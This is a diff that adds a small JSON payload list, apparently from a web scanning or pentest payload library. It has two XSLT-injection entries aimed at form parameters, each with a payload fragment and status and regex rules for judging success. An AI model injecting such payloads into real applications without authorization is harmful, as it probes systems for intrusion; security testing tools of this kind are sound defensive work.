@@ -1,0 +1,24 @@
+[
+  {
+    "payload_id": "OWP-246150",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "extension-element-prefixes=\"exploit\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246151",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "version=\"1.0\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  }
+]
